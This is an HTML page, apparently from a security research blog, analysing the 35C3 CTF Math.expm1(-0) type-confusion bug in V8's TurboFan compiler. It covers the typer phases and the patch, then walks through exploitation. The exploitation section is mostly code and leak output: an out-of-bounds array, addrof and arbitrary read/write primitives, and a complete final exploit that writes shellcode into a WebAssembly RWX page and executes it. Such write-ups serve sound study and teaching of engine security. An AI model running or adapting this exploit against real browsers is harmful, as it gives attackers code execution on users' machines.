@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>expm1-35C3 - Bug/ Optimizations Analysis | Security Research Blog</title>
+    <meta name="description" content="In this post, we’ll dive deep into a fascinating bug in the V8 JavaScript engine that arises from the mishandling of the Math.expm1(-0) function during the opti...">
+    <link href="/src/index.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <style>
+        body { 
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+        }
+        .code-block {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .gradient-text {
+            background: linear-gradient(135deg, #f97316, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
+        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        .toc-sidebar {
+            position: fixed;
+            top: 2rem;
+            left: 1rem;
+            max-height: calc(100vh - 4rem);
+            overflow-y: auto;
+            background: #1a1a1a;
+            border: 1px solid #374151;
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            margin-right: 0;
+            width: 280px;
+            flex-shrink: 0;
+            z-index: 10;
+        }
+        .toc-title {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #9ca3af;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #374151;
+            padding-bottom: 0.5rem;
+        }
+        .toc-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .toc-sublist {
+            list-style: none;
+            padding-left: 0.5rem;
+            margin-top: 0.25rem;
+        }
+        .toc-item {
+            margin: 0.25rem 0;
+        }
+        .toc-level-2 {
+            padding-left: 0.25rem;
+        }
+        .toc-level-3 {
+            padding-left: 0.75rem;
+        }
+        .toc-level-4 {
+            padding-left: 1.25rem;
+        }
+        .toc-link {
+            display: block;
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 0.875rem;
+            line-height: 1.5;
+            padding: 0.25rem 0;
+            border-radius: 0.25rem;
+            transition: all 0.2s;
+        }
+        .toc-link:hover {
+            color: #60a5fa;
+            background: #1f2937;
+            padding-left: 0.5rem;
+        }
+        @media (max-width: 1024px) {
+            .toc-sidebar {
+                display: none;
+            }
+        }
+        .prose h1 {
+            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-top: 3rem;
+            margin-bottom: 1.5rem;
+        }
+        .prose h2 {
+            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-top: 3rem;
+            margin-bottom: 1rem;
+            border-bottom: 2px solid #374151;
+            padding-bottom: 0.5rem;
+        }
+        .prose h3 {
+            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-top: 2rem;
+            margin-bottom: 0.75rem;
+        }
+        .prose h4 {
+            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-top: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+        .prose p {
+            margin-bottom: 1.5rem;
+            line-height: 1.7;
+            color: #d1d5db;
+        }
+        .prose strong {
+            color: #f3f4f6;
+            font-weight: 600;
+        }
+        .prose code {
+            background: #1e1e1e;
+            color: #fbbf24;
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        .prose pre {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 2rem 0;
+        }
+        .prose pre code {
+            background: transparent;
+            color: #e5e7eb;
+            padding: 0;
+            border-radius: 0;
+        }
+        .prose blockquote {
+          background:rgb(93, 45, 26);
+          color:rgb(255, 255, 255);
+          border-left: 4px solid #ff8c00;
+          padding: 1rem 1.25rem;
+          margin: 1.25rem 0;
+          border-radius: calc(var(--radius) - 2px);
+        }
+        .prose ul, .prose ol {
+            list-style-color: #ff8c00;
+            list-style-type: disc;
+            list-style-position: outside;
+            margin: 1.5rem 0;
+            padding-left: 2rem;
+        }
+        .prose li {
+            margin: 0.5rem 0;
+            color: #d1d5db;
+        }
+        .prose li::marker {
+            color: #ff8c00 !important;
+        }
+        .prose ol li {
+            list-style-type: decimal;
+        }
+            margin: 2rem 0;
+            background: #1e1e1e;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .prose th, .prose td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        .prose th {
+            background: #2d2d2d;
+            color: #f3f4f6;
+            font-weight: 600;
+        }
+        .prose img {
+            border-radius: 8px;
+            margin: 2rem 0;
+            max-width: 100%;
+        }
+        .prose hr {
+            border: none;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #374151, transparent);
+            margin: 3rem 0;
+        }
+        .prose a { color: rgb(3, 203, 146); text-decoration: underline; }
+    </style>
+</head>
+<body class="min-h-screen">
+    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
+        <header class="mb-12">
+            <a href="/blogs" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">
+                <span class="gradient-text">expm1-35C3 - Bug/ Optimizations Analysis</span>
+            </h1>
+            <div class="mb-8"><img src="/posts/expm1-35C3-Bug/-Optimizations-Analysis/featured.png" alt="expm1-35C3 - Bug/ Optimizations Analysis cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
+            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
+                <span>February 19, 2024</span>
+                <span>•</span>
+                <span>10 min read</span>
+                <span>•</span>
+                <div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">math.expm1</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">typer</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">OOB</span></div>
+            </div>
+        </header>
+
+        <div class="flex flex-col lg:flex-row justify-start gap-6">
+            <aside class="hidden lg:block"><nav class="toc-sidebar"><h3 class="toc-title">Table of Contents</h3><ul class="toc-list"><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#background-on-mathexpm1" class="toc-link">Background on Math.expm1</a></li><li class="toc-item toc-level-2"><a href="#expected-behavior-of-mathexpm1-0" class="toc-link">Expected Behavior of Math.expm1(-0)</a></li><li class="toc-item toc-level-2"><a href="#understanding-the-bug" class="toc-link">Understanding the bug:</a></li><li class="toc-item toc-level-2"><a href="#objectis" class="toc-link">Object.is()</a></li><ul class="toc-sublist"><li class="toc-item toc-level-3"><a href="#1--initial-phase" class="toc-link">1- Initial Phase:</a></li><li class="toc-item toc-level-3"><a href="#2--typed-optimization" class="toc-link">2- Typed Optimization:</a></li><li class="toc-item toc-level-3"><a href="#3--simplified-lowering" class="toc-link">3- Simplified Lowering:</a></li></ul><li class="toc-item toc-level-2"><a href="#patch-and-bug-details" class="toc-link">Patch and Bug Details:</a></li><li class="toc-item toc-level-2"><a href="#pipeline-of-turbofan" class="toc-link">Pipeline of TurboFan:</a></li><li class="toc-item toc-level-2"><a href="#typer-phase" class="toc-link">Typer Phase:</a></li><li class="toc-item toc-level-2"><a href="#type-lowering" class="toc-link">Type Lowering:</a></li><li class="toc-item toc-level-2"><a href="#escape-analysis" class="toc-link">Escape analysis:</a></li><li class="toc-item toc-level-2"><a href="#additional-optimizations" class="toc-link">Additional Optimizations</a></li><li class="toc-item toc-level-2"><a href="#exploitation" class="toc-link">Exploitation:</a></li><li class="toc-item toc-level-2"><a href="#oob-array-creation" class="toc-link">OOB Array Creation:</a></li><ul class="toc-sublist"><li class="toc-item toc-level-3"><a href="#addrof-primitive" class="toc-link">Addrof Primitive:</a></li><li class="toc-item toc-level-3"><a href="#arb-read-arb-write" class="toc-link">Arb Read / Arb Write:</a></li></ul><li class="toc-item toc-level-2"><a href="#final-exploit" class="toc-link">Final Exploit:</a></li><li class="toc-item toc-level-2"><a href="#debugging-tools" class="toc-link">Debugging Tools:</a></li><li class="toc-item toc-level-2"><a href="#useful-links" class="toc-link">Useful Links:</a></li></ul></ul></nav></aside>
+            <article class="prose prose-invert max-w-none ml-0 lg:max-w-6xl lg:ml-10">
+<p>In this post, we’ll dive deep into a fascinating bug in the V8 JavaScript engine that arises from the mishandling of the Math.expm1(-0) function during the optimization process. </p>
+<!--more-->
+<p>We'll break down how this edge case is misoptimized by V8's Turbofan compiler, explore the root cause of the issue, and demonstrate how this leads to unexpected behavior.</p>
+<p>For context, we’ll focus on the technical aspects surrounding the typer phase and its consequences for browser exploitation. PS: This is more or less my notes, So if there is any errors/false observations please bear with it and ping me on discord (tourpran). </p>
+<h2 id="background-on-mathexpm1">Background on Math.expm1</h2>
+<p>The <code>Math.expm1(x)</code> function calculates <code>e^x - 1</code> with improved precision for small values of <code>x</code>. For example:</p>
+<ul>
+<li><code>Math.expm1(0)</code> returns <code>0</code></li>
+<li><code>Math.expm1(-0)</code> returns <code>-0</code>, due to the handling of signed zeros in JavaScript.</li>
+</ul>
+<p>This distinction is significant in JavaScript, where <code>0</code> and <code>-0</code> behave differently in equality comparisons and mathematical operations. According to the ECMAScript specification, <code>Math.expm1(-0)</code> should return <code>-0</code>, but a bug in V8's optimization pipeline causes it to be incorrectly handled.</p>
+<h2 id="expected-behavior-of-mathexpm1-0">Expected Behavior of Math.expm1(-0)</h2>
+<p>The ECMAScript spec mandates that <code>Math.expm1(-0)</code> must return <code>-0</code>. This behavior is critical when dealing with negative zero in JavaScript. Here’s why:</p>
+<ul>
+<li><code>0</code> and <code>-0</code> are distinct values in JavaScript, despite being equal according to <code>==</code> and <code>===</code>.</li>
+<li>However, <code>Object.is(0, -0)</code> correctly returns <code>false</code>, recognizing the difference between the two.<br />
+When <code>Math.expm1(-0)</code> is mishandled during optimization, it leads to incorrect behavior in cases where signed zeros are important.</li>
+</ul>
+<h2 id="understanding-the-bug">Understanding the bug:</h2>
+<p>The typer processes the code by executing several phases:</p>
+<ul>
+<li><strong>Typer Phase</strong>: Determines the types of various nodes in the graph.</li>
+<li><strong>TypeNarrowingReducer</strong>: Eliminates unnecessary loads based on narrowed types.</li>
+<li><strong>Simplified Lowering Phase</strong>: Applies further optimizations by lowering nodes into simpler operations.<br />
+In the case of <code>Math.expm1(-0)</code>, the result should always be <code>-0</code>. However, the <code>typer</code> mistakenly classifies the range as <code>(plainNumber, NaN)</code>, when in fact, <code>-0</code> is neither a <code>plain number</code> nor a <code>NaN</code>, leading to an incorrect assumption during <code>type analysis</code>.<br />
+<img src="/images/math_expm_bug/image-3.png" alt="idek4" /></li>
+</ul>
+<h2 id="objectis">Object.is()</h2>
+<h3 id="1--initial-phase">1- Initial Phase:</h3>
+<ul>
+<li>The <code>typer</code> assigns the <code>Object.is()</code> node as a <code>SameValue</code> node. This can be seen in <a href="https://v8.github.io/tools/head/turbolizer/index.html">turbolizer</a>.</li>
+</ul>
+<p><img src="/images/math_expm_bug/image.png" alt="initial" /></p>
+<h3 id="2--typed-optimization">2- Typed Optimization:</h3>
+<ul>
+<li>In this phase, <code>SameValue</code> is further reduced to <code>ObjectIsMinusZero()</code> when either side of the comparison involves <code>-0</code>. This makes comparisons more efficient by focusing on the specific case of <code>-0</code>.</li>
+</ul>
+<pre><code class="c++ language-c++">else if (lhs_type.Is(Type::MinusZero())) {
+    // SameValue(x:minus-zero,y) =&gt; ObjectIsMinusZero(y)
+    node-&gt;RemoveInput(0);
+    NodeProperties::ChangeOp(node, simplified()-&gt;ObjectIsMinusZero());
+    return Changed(node);
+  } else if (rhs_type.Is(Type::MinusZero())) {
+    // SameValue(x,y:minus-zero) =&gt; ObjectIsMinusZero(x)
+    node-&gt;RemoveInput(1);
+    NodeProperties::ChangeOp(node, simplified()-&gt;ObjectIsMinusZero());
+    return Changed(node);
+  }
+</code></pre>
+<p><img src="/images/math_expm_bug/image-1.png" alt="idek1" /></p>
+<h3 id="3--simplified-lowering">3- Simplified Lowering:</h3>
+<ul>
+<li>This phase further optimizes the <code>ObjectIsMinusZero()</code> node. If the input is confirmed to be <code>-0</code>, the node is simplified and deferred for replacement, enhancing overall efficiency.</li>
+</ul>
+<pre><code class="cpp language-cpp">case IrOpcode::kObjectIsMinusZero: 
+Type const input_type = GetUpperBound(node-&gt;InputAt(0));
+if (input_type.Is(Type::MinusZero())) {
+    VisitUnop(node, UseInfo::None(), MachineRepresentation::kBit);
+    if (lower()) {
+    DeferReplacement(node, lowering-&gt;jsgraph()-&gt;Int32Constant(1));
+    }
+}
+</code></pre>
+<h2 id="patch-and-bug-details">Patch and Bug Details:</h2>
+<ul>
+<li>The <code>Math.expm1()</code> operation is incorrectly converted to a combination of <code>Float64Expm1</code> and <code>ChangeFloat64ToTagged</code>, which causes <code>-0</code> to be truncated to <code>0</code>.</li>
+<li>By using a <code>Call</code> node and invoking the inbuilt V8 <code>Math.expm1</code>, this truncation issue can be avoided.</li>
+<li>The patch has only been applied to <code>typer.cc</code> but not to <code>operation-typer</code>, allowing the creation of a <code>Call</code> node using V8 builtins to correctly handle <code>Math.expm1</code>, even though it still makes incorrect type assumptions.</li>
+</ul>
+<p><img src="/images/math_expm_bug/image-4.png" alt="ide" /></p>
+<p>This patch addresses the issue in <code>typer.cc</code>, but a more comprehensive solution requires changes in other parts of the type system to fully fix the handling of <code>-0</code> in <code>Math.expm1</code>.</p>
+<h2 id="pipeline-of-turbofan">Pipeline of TurboFan:</h2>
+<p><img src="/images/math_expm_bug/image-5.png" alt="Pipeline of TurboFan" /></p>
+<p>TurboFan’s pipeline consists of multiple phases that optimize and lower JavaScript code into highly optimized machine code. The key stages include type inference, node optimization (such as <code>SameValue</code> being converted to checks like <code>ObjectIsMinusZero</code>), and various lowering phases that simplify and optimize the code.</p>
+<h2 id="typer-phase">Typer Phase:</h2>
+<ul>
+<li>The typer traverses all the nodes in the intermediate representation (IR) and processes them through the GraphReducer.</li>
+<li>For each node, it attempts to assign the most accurate type information, optimizing how the node will be executed in subsequent phases.</li>
+</ul>
+<h2 id="type-lowering">Type Lowering:</h2>
+<ul>
+<li>This phase focuses on extensive optimizations, including refining operations and simplifying nodes for better performance in the backend stages of Turbofan.<br />
+<img src="/images/math_expm_bug/image-7.png" alt="Type Lowering Phase" /></li>
+</ul>
+<h2 id="escape-analysis">Escape analysis:</h2>
+<pre><code class="js language-js">function f() {
+  let o = {a: 5};
+  return o.a;
+}
+</code></pre>
+<blockquote>
+  <p>Clearly, it can be rewritten as:</p>
+</blockquote>
+<pre><code class="js language-js">function f() {
+  let 0. a = 5;
+  return o_a;
+}
+</code></pre>
+<p><a href="https://www.youtube.com/watch?v=KiWEWLwQ3oI&ab_channel=NightHacking">Great Video on Escape Analysis</a></p>
+<h2 id="additional-optimizations">Additional Optimizations</h2>
+<ul>
+<li>If you're interested, you can find more information about V8 TurboFan's optimizations in the documentation <a href="https://v8.dev/docs/turbofan">here</a>.</li>
+</ul>
+<h2 id="exploitation">Exploitation:</h2>
+<ul>
+<li><p><strong>Problem:</strong> The <code>sameValue</code> variable is of boolean type, which leads to the type assumption of (0, 1337), resulting in no out-of-bounds (OOB) access.  <br />
+<img src="/images/math_expm_bug/image-8.png" alt="bob" />  <br />
+<img src="/images/math_expm_bug/image-9.png" alt="bob" />  </p></li>
+<li><p>As mentioned in the blog, we need to retain the <code>sameValue</code> node until the final optimization, folding it to <code>true</code>. This means the compiler shouldn't be aware that we're comparing with <code>-0</code> until the very last optimization step.  </p></li>
+<li><p>In escape analysis, we can replace -0 with <code>Object.is()</code>, and during simplified lowering, we achieve the desired range value, allowing us to remove the bounds check. The <code>assumed</code> return type becomes false, ensuring that it will always remain within the array limits.  </p></li>
+</ul>
+<blockquote>
+  <p>79: CheckBounds[VectorSlotPair(INVALID)] (#125:NumberMultiply, #58:NumberConstant, #45:Checkpoint, #43:Call)  [Static type: Range(0, 4), Feedback type: Range(0, 0)]  </p>
+</blockquote>
+<p><img src="/images/math_expm_bug/image-10.png" alt="idekde" />  </p>
+<h2 id="oob-array-creation">OOB Array Creation:</h2>
+<ul>
+<li>By exploiting out-of-bounds (OOB) array access, we can leak the addresses of objects by keeping them close to a float array. After much trial and error, along with extensive monkey patching, I finally discovered a more effective method for achieving a memory leak.</li>
+</ul>
+<pre><code class="javascript language-javascript">function addrof(x, i = 1) {
+    let a = [1.1, 2.2, 3.3];
+    let b = [5.5, 5.5, 5.5, 5.5, 5.5];
+    let o = { m: -0 };
+    let t = Object.is(Math.expm1(x), o.m) + 0;
+    t *= (i + 0); // Convert i to an integral type.
+    let val = a[t];
+    oob_rw_buffer = b;
+    return val;
+}
+</code></pre>
+<ul>
+<li><p>Here, <code>a</code> is the array from which we want to access out-of-bounds values, while <code>b</code> is the array where we intend to manipulate the length field.  </p></li>
+<li><p><strong>Tricky Part:</strong> The parameter <code>i</code> has an ambiguous type, so I added <code>0</code> to it to ensure it is treated as an integral type. This adjustment, along with the feedback, enables the OOB read. Silly JavaScript engine!  </p></li>
+<li><p>Finally, I'm storing the context of <code>b</code> in the <code>oob_rw_buffer</code>. Below is a rough illustration of the leak following the adjustment to the fixed array <code>a</code>.</p></li>
+</ul>
+<p><strong>Leaks of the current state:</strong></p>
+<pre><code>3) int: 0x7a7e2501459
+4) int: 0x500000000
+5) int: 0x4016000000000000
+6) int: 0x4016000000000000
+7) int: 0x4016000000000000
+8) int: 0x4016000000000000
+9) int: 0x4016000000000000
+10) int: 0x375928582cf9    - (map of b)
+11) int: 0x7a7e2500c21     - (property of b)
+12) int: 0x65ad13cc1c9     - (element backing pointer of b)
+13) int: 0x500000000       - (length field)
+14) int: 0x7a7e2500561
+15) int: 0x8000000000000000
+16) int: 0x3ff199999999999a
+17) int: 0x3ff199999999999a
+18) int: 0x3ff199999999999a
+19) int: 0x3ff199999999999a
+</code></pre>
+<h3 id="addrof-primitive">Addrof Primitive:</h3>
+<ul>
+<li>With the OOB array in place, having another array afterwards allows us to perform an OOB array read, thus enabling the creation of an <code>addrof</code> primitive.  </li>
+</ul>
+<pre><code class="js language-js">let oob_rw_buffer = undefined;
+let aux_arr = undefined;
+function addrof(obj){
+  aux_arr[0] = obj;
+  return oob_rw_buffer[0x12];
+}
+function stagel(x, i=1){
+  let a = [1.1, 2.2, 3.3];
+  let b = [5.5, 5.5, 5.5, 5.5, 5.5];
+  let c = [{}, 1, 2];
+  let o = {m: -0};
+  let t = Object.is(Math.expml(x), o.m) + 0;  // trigger the bug.
+  t *= (i+0);                                 // i to inegral.
+  a[t] = 1024*1024;
+  oob_rw_buffer = b;                          // expose b to global scope
+  aux arr = c;
+  return 0;
+}
+</code></pre>
+<h3 id="arb-read--arb-write">Arb Read / Arb Write:</h3>
+<ul>
+<li>By storing the <code>ArrayBuffer</code> after all the allocations, we can calculate the offset difference between the <code>ArrayBuffer</code> and the OOB array. This enables us to perform arbitrary read and write operations.</li>
+</ul>
+<pre><code class="javascript language-javascript">function arb_write(addr, val) {
+    oob_rw_buffer[diff / 8n] = addr.i2f();
+    dv.setBigUint64(0, val, true);
+}
+</code></pre>
+<pre><code class="javascript language-javascript">function arb_read(addr) {
+    oob_rw_buffer[diff / 8n] = addr.i2f();
+    return dv.getBigUint64(0, true);
+}
+</code></pre>
+<h2 id="final-exploit">Final Exploit:</h2>
+<blockquote>
+  <p>This is the final exploit I've developed, ready to target the V8 engine. However, to ensure reliability for Chrome, I need to correct the objects I corrupted and proceed with caution. If we manage to escape the Chrome sandbox, it’s game over.</p>
+</blockquote>
+<pre><code class="js language-js">// ------------------------------------------------ Utility- Functions ------------------------------------------------ //
+let conversion_buffer = new ArrayBuffer(8);
+let float_view = new Float64Array(conversion_buffer);
+let int_view = new BigUint64Array(conversion_buffer);
+BigInt.prototype.hex = function() {
+  return '0x' + this.toString(16);
+};
+BigInt.prototype.i2f = function() {
+  int_view[0] = this;
+  return float_view[0];
+}
+BigInt.prototype.smi2f = function() {
+  int_view[0] = this &lt;&lt; 32n;
+  return float_view[0];
+}
+Number.prototype.f2i = function() {
+  float_view[0] = this;
+  return int_view[0];
+}
+Number.prototype.f2smi = function() {
+  float_view[0] = this;
+  return int_view[0] &gt;&gt; 32n;
+}
+Number.prototype.i2f = function() {
+  return BigInt(this).i2f();
+}
+Number.prototype.smi2f = function() {
+  return BigInt(this).smi2f();
+}
+
+// ----------------------------------------------- Starting the exploit ----------------------------------------------- //
+
+let oob_rw_buffer = undefined;
+let aux_arr = undefined;
+
+function addrof(obj){
+    aux_arr[0] = obj;
+    return oob_rw_buffer[0x12];
+}
+
+function stage1(x, i=1){
+    let a = [1.1, 2.2, 3.3];
+    let b = [5.5, 5.5, 5.5, 5.5, 5.5];
+    let c = [{}, 1, 2];
+    let o = {m: -0};
+    let t = Object.is(Math.expm1(x), o.m) + 0; // trigger the bug.
+    t *= (i+0); // i to inegral.
+    a[t] = 1024*1024;
+    oob_rw_buffer = b; // expose b to global scope
+    aux_arr = c;
+    return 0;
+  }
+
+stage1(0);
+for(let i=0;i&lt;100000;i++){
+    stage1("0");
+}
+stage1(-0, 13); // get the OOB array.
+console.log("[+] Stage 1: Obtained a OOB array");
+
+// Stage 2
+function arb_write(addr, val){
+  oob_rw_buffer[diff/8n] = addr.i2f();
+  dv.setUint32(0, val, true);
+}
+
+function arb_read(addr){
+  oob_rw_buffer[diff/8n] = addr.i2f();
+  return dv.getBigUint64(0, true);
+}
+
+function shell_write(addr, shellcode){
+  for(let i=0;i&lt;shellcode.length;i++){
+    arb_write(addr+BigInt(4*i), shellcode[i]);
+  }
+}
+let buf = new ArrayBuffer(0x100);
+let dv = new DataView(buf);
+
+buf_addr = addrof(buf).f2i();
+oob_addr = addrof(oob_rw_buffer).f2i();
+let diff = buf_addr-oob_addr+72n; //from the OOB array to array buffer 
+
+console.log("[+] ArrayBuffer addr: " + buf_addr.hex());
+console.log("[+] Offset btw oob and arraybuffer: " + diff);
+
+
+// wasm for RWS shellcode
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule);
+var func = wasmInstance.exports.main;
+
+var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
+
+rwx = arb_read(addrof(wasmInstance).f2i() +0x00e8n -1n);
+console.log("[+] Got the Address of RWX segment: " + rwx.hex());
+shell_write(rwx, shellcode);
+func(); 
+</code></pre>
+<p>To get the follow files, you can visit <a href="https://github.com/tourpran/pwn-hub/tree/main/v8-exp/expm1-35C3">here</a>.</p>
+<h2 id="debugging-tools">Debugging Tools:</h2>
+<ul>
+<li><p>The helper code for GDB can be found in <code>src/objects-printer.cc</code>.</p></li>
+<li><p>The node structure comprises a variety of methods, including:</p></li>
+<li><p><strong>Methods:</strong></p>
+<ul>
+<li><code>new</code>, <code>clone</code>, <code>isDead</code>, <code>kill</code>, etc.</li></ul></li>
+<li><p><strong>Variables:</strong></p>
+<ul>
+<li>Includes operation descriptions (e.g., <code>opcode</code> related) and properties.</li></ul></li>
+<li><p>Use the following flags for additional insights:</p></li>
+<li><p><code>--trace-turbo</code>: Generates the Turbolizer graph.</p></li>
+<li><p><code>--trace-representation</code>: Provides feedback types and information about each optimization phase.</p></li>
+</ul>
+<h2 id="useful-links">Useful Links:</h2>
+<ul>
+<li><a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8">Exploiting Math.expm1 in V8</a></li>
+<li><a href="https://www.jaybosamiya.com/blog/2019/01/02/krautflare/">Krautflare: A Deep Dive</a></li>
+</ul>
+            </article>
+        </div>
+        <!-- Navigation -->
+        <nav class="mt-16 pt-8 border-t border-gray-700">
+            <div class="flex justify-between items-center">
+                <div class="flex-1">
+                    <a href="/posts/CVE-2024-0517-Analysis.html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
+                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
+                        </svg>
+                        <div class="text-left">
+                            <div class="text-xs text-gray-400">Previous</div>
+                            <div class="font-medium">CVE-2024-0517 Quick Blog</div>
+                        </div>
+                    </a>
+                </div>
+                <div class="flex-1 text-center">
+                    <a href="/blogs" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Posts</a>
+                </div>
+                <div class="flex-1 text-right">
+                    <a href="/posts/Executable-and-Linkable-Format-Sections-and-Segments.html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
+                        <div class="text-right">
+                            <div class="text-xs text-gray-400">Next</div>
+                            <div class="font-medium">Executable and Linkable Format - Sections and Segments</div>
+                        </div>
+                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        </nav>
+    </div>
+<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
+</body>
+</html>
